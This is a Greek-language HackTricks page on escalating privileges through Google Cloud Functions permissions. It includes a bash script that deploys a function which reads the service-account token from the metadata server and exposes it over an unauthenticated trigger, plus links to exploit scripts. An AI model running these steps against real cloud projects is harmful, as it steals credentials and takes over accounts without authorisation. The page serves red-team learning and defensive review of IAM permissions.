# GCP - Cloudfunctions Privesc

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## cloudfunctions

Περισσότερες πληροφορίες για τις Cloud Functions:

{% content-ref url="../gcp-services/gcp-cloud-functions-enum.md" %}
[gcp-cloud-functions-enum.md](../gcp-services/gcp-cloud-functions-enum.md)
{% endcontent-ref %}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Ένας επιτιθέμενος με αυτά τα προνόμια μπορεί **να δημιουργήσει μια νέα Cloud Function με αυθαίρετο (κακόβουλο) κώδικα και να της αναθέσει έναν Service Account**. Στη συνέχεια, να διαρρεύσει το token του Service Account από τα metadata για να κλιμακώσει τα προνόμια σε αυτόν.\
Μπορεί να απαιτούνται κάποια προνόμια για την ενεργοποίηση της λειτουργίας.

Τα scripts εκμετάλλευσης για αυτή τη μέθοδο μπορούν να βρεθούν [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) και [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) και το προετοιμασμένο .zip αρχείο μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Ένας επιτιθέμενος με αυτά τα προνόμια μπορεί **να τροποποιήσει τον κώδικα μιας Function και ακόμη και να τροποποιήσει τον service account που είναι συνδεδεμένος** με σκοπό την εξαγωγή του token.\
Μπορεί να απαιτούνται κάποια προνόμια για την ενεργοποίηση της λειτουργίας.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--trigger-http \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--allow-unauthenticated

# If you don't have permissions to change the IAM policy, the "--allow-unauthenticated" will just fail and do nothing

# Get SA tokin calling the new function code
gcloud functions call <cloudfunction-name>
```
Το script εκμετάλλευσης για αυτή τη μέθοδο μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Με αυτή την άδεια μπορείτε να πάρετε ένα **υπογεγραμμένο URL για να ανεβάσετε ένα αρχείο σε έναν bucket λειτουργίας (αλλά ο κώδικας της λειτουργίας δεν θα αλλάξει, χρειάζεται ακόμα να τον ενημερώσετε)**

{% code overflow="wrap" %}
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
{% endcode %}

Δεν είμαι σίγουρος πόσο χρήσιμη είναι αυτή η άδεια από την προοπτική ενός επιτιθέμενου, αλλά είναι καλό να το γνωρίζουμε.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Δώστε στον εαυτό σας οποιοδήποτε από τα προηγούμενα **`.update`** ή **`.create`** προνόμια για να κλιμακώσετε.

### `cloudfunctions.functions.update`

Έχοντας μόνο **`cloudfunctions`** άδειες, χωρίς **`iam.serviceAccounts.actAs`** **δεν θα μπορέσετε να ενημερώσετε τη λειτουργία, ΟΠΟΤΕ ΑΥΤΟ ΔΕΝ ΕΙΝΑΙ ΕΓΚΥΡΟ PRIVESC.**

### Άδειες Εγγραφής Κάδου

Μπορεί να νομίζετε ότι ένας επιτιθέμενος με **άδειες εγγραφής στον κάδο** όπου αποθηκεύεται ο κώδικας των Cloud Functions θα μπορεί να **τροποποιήσει τον κώδικα αντικαθιστώντας** το `function_code.zip` και στη συνέχεια να κάνει τη λειτουργία να **εκτελέσει αυθαίρετο** κώδικα.

{% hint style="success" %}
**Ωστόσο, αυτό δεν είναι αλήθεια, απλώς αντικαθιστώντας τον κώδικα μέσα στον κάδο δεν θα τροποποιηθεί ο κώδικας που εκτελείται.**
{% endhint %}

## Αναφορές

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
